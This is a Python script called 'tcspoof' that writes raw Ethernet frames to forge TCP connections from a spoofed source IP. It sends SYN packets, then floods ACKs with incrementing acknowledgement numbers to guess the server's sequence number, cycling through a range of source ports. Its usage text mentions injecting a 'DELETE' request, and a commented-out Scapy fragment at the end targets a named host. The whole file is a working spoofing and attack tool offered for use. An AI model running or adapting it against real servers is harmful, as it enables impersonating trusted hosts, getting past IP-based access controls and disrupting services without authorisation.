#!/usr/bin/env python
import sys, time, struct, socket, array

if len(sys.argv) != 6:
    print("Usage: ./tcspoof iface srcMAC gatewayMAC srcIP:sport-range dstIP:dport")
    print("E.g. ./tcspoof eth0 aa:bb:dd:99:88:77 aa:bb:cc:00:11:22 1.2.3.4:1024-65535 80.100.131.150:80") # 'DELETE / HTTP/1.0\\n\\n'")
    print("The source port range is inclusive.")
    print("NOTE: appending payload currently not supported for a couple reasons.")
    sys.exit(1)


### Parse parameters

dev = sys.argv[1]

ourMAC = sys.argv[2]

dstMAC = sys.argv[3]

srcIP, srcPort = sys.argv[4].split(':')
srcPort = srcPort.split('-')
srcPort[0] = int(srcPort[0])
srcPort[1] = int(srcPort[1])

dstIP, dstPort = sys.argv[5].split(':')
dstPort = int(dstPort)

# Convert hexadecimal (aa:bb:cc) to binary (\xaa\xbb\xcc)
mac = ''
for macpart in dstMAC.split(":"):
    mac += chr(int(macpart, 16))
dstMAC = mac

mac = ''
for macpart in ourMAC.split(":"):
    mac += chr(int(macpart, 16))
ourMAC = mac

### End of parameter parsing

# Precompute some fields that we are going to use a lot
srcIP2 = socket.inet_aton(srcIP) # 32 bits
dstIP2 = socket.inet_aton(dstIP) # 32 bits
struc20 = struct.pack("!H", 20)
winsize = struct.pack("!H", 0xeffe)

# Checksumming is taken from Scapy.
if struct.pack("H",1) == "\x00\x01": # big endian
    def checksum(pkt):
        if len(pkt) % 2 == 1:
            pkt += "\0"
        s = sum(array.array("H", pkt))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s
        return s & 0xffff
else:
    def checksum(pkt):
        if len(pkt) % 2 == 1:
            pkt += "\0"
        s = sum(array.array("H", pkt))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s
        return (((s>>8)&0xff)|s<<8) & 0xffff

def build_ip_header(datalength, srcIP, dstIP):
    version = 4 # 4 bits
    headerlen = 5 # 5*32bits = 20 bytes # 4 bits
    dscp = 0 # 6 bits
    ecn = 0 # disable capability # 2 bits
    totalLength = datalength + 20 # 16 bits
    identification = 22641 # random # 16 bits
    flags = 0 # 3 bits
    fragmentOffset = 0 # 13 bits
    ttl = 64 # 8 bits
    proto = 6 # 8 bits
    chksum = 0 # initial value # 16 bits
    srcIP = socket.inet_aton(srcIP) # 32 bits
    dstIP = socket.inet_aton(dstIP) # 32 bits

    # Convert fields to binary
    version_headerlen = chr(((version & 0xf) << 4) | headerlen & 0x0f)
    dscp_ecn = "\0"
    totalLen = struct.pack("!H", totalLength)
    ident = "xD"
    flags_fragmentOffset = "\0\0"
    ttl = chr(64)
    proto = chr(6)
    chksum = "\0\0"

    without_checksum = version_headerlen + dscp_ecn + totalLen + ident + flags_fragmentOffset + ttl + proto + chksum + srcIP + dstIP
    chksum = checksum(without_checksum)
    if chksum == 0:
        chksum = 0xffff
    return without_checksum[:10] + chr(chksum >> 8) + chr(chksum & 0xff) + without_checksum[12:]

# Create a static IP header, 60% performance increase over computing it every time
ip_header = build_ip_header(20, srcIP, dstIP)

def build_tcp_header(sport, seqno, ackno, syn):
    dataOffset = chr(0b01010000) # header length (5) + 3 bits waste (000) + NS flag (0)
    if syn == True:
        flags = chr(0b00000010) # syn flag set, all other flags NOT set
    else:
        flags = chr(0b00010000) # ack flag set, all other flags NOT set

    without_checksum = struct.pack("!HHLL", sport, dstPort, seqno, ackno) + dataOffset + flags + winsize + "\0\0\0\0"
    # This pseudo-header has to be used in checksum computation (see TCP RFC)
    pseudoHeader = srcIP2 + dstIP2 + '\0' + chr(6) + struc20
    chksum = checksum(pseudoHeader + without_checksum)
    if chksum == 0:
        chksum = 0xffff
    return without_checksum[:16] + struct.pack("!H", chksum) + without_checksum[18:]

def build_syn(ourMAC, dstMAC, srcIP, srcPort, dstIP, dstPort):
    eth_header = dstMAC + ourMAC + "\x08\x00" # type=IP
    tcp_header = build_tcp_header(srcPort, 42, 0, True)
    ip_header = build_ip_header(len(tcp_header), srcIP, dstIP)
    return eth_header + ip_header + tcp_header

def build_ack(srcPort, ackno):
    eth_header = dstMAC + ourMAC + "\x08\x00" # type=IP
    tcp_header = build_tcp_header(srcPort, 43, ackno, False)
    return eth_header + ip_header + tcp_header

# Create a socket to send raw ethernet frames over
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)

bind = (dev, 0)
starttime = 0
sport = srcPort[0] - 1
try:
    while True:
        # Every 18 seconds (to compensate for latency), send a new SYN packet and start over
        if time.time() - starttime > 18:
            sys.stdout.write('.')
            # Since we write to stdout/stderr manually, we also need to flush manually...
            sys.stdout.flush()
            sys.stderr.flush()
            sport += 1
            if sport > srcPort[1]:
                sport = srcPort[0]
            try:
                sock.sendto(build_syn(ourMAC, dstMAC, srcIP, sport, dstIP, dstPort), bind)
            except socket.error:
                sys.stderr.write('!')
            ackno = 1
            starttime = time.time()
            # Wait 100ms to make sure our ACK doesn't arrive before the server sent the SYN+ACK
            time.sleep(0.1)
        try:
            sock.sendto(build_ack(sport, ackno), bind)
        except socket.error: # This happened a lot when sending on 8 cores when the transmit buffer was full (virtual NICs are slow...)
            sys.stderr.write('!')
        ackno += 1
except KeyboardInterrupt:
    print("Caught keyboard interrupt.")

'''
Old code from Scapy, but scapy is way too slow to use here (hence the above own implementation...)

syn = ip / TCP(sport = port, dport = 80, flags = 'S', seq = 42)
synack = sr1(syn)
starttime = time.time()
while True:
	sendp(eth / ip / TCP(sport = synack.dport, dport = 80, flags = "A", seq = synack.ack, ack = RandNum(1, 65535)), iface = 'eth0')
	if time.time() - starttime > 22:
		break

send(ip / TCP(sport = synack.dport, dport = 80, flags = "A", seq = synack.ack, ack = synack.seq + 1))
data = ip / TCP(sport = synack.dport, dport = 80, flags = "A", seq = synack.ack, ack = synack.seq + 1) / 'GET / HTTP/1.0\r\nHost: lgms.nl\r\n\r\n'
print(sr1(data))
'''
